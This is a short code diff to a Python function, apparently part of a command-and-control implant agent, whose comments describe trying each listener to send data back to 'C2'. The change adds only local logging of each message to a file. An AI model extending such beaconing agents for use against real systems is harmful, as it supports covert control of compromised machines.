@@ -87,6 +87,8 @@ def send_message(message = None):
     global listeners
     global curlistener
 
+    with open("agent.log","a") as fh:
+        fh.write("sendmessage called with data = {}\n".format(message))
     #Calls each listener in turn to try and send data back
     #to C2. Only increases missedcheckins once every one has been tried
     for listener in listeners:
